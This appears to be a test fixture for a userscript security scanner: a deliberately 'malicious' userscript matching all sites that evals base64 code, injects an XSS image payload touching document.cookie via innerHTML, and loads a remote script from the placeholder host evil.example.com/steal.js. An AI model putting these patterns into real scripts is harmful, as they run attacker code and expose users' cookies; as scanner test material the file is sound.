// ==UserScript==
// @name         Malicious Userscript Scenario
// @namespace    https://evil.example.com/exploit
// @version      6.6.6
// @description  Attempts dynamic eval, innerHTML injection, and script tag loading
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function () {
  'use strict';

  // 1. Dynamic code evaluation
  const code = atob('Y29uc29sZS5sb2coJ2V2aWwnKQ==');
  eval(code);

  // 2. Unsafe DOM sink injection
  const payload = '<img src=x onerror=alert(document.cookie)>';
  document.body.innerHTML = payload;

  // 3. Dynamic script injection
  const s = document.createElement('script');
  s.src = 'https://evil.example.com/steal.js';
  document.head.appendChild(s);
})();
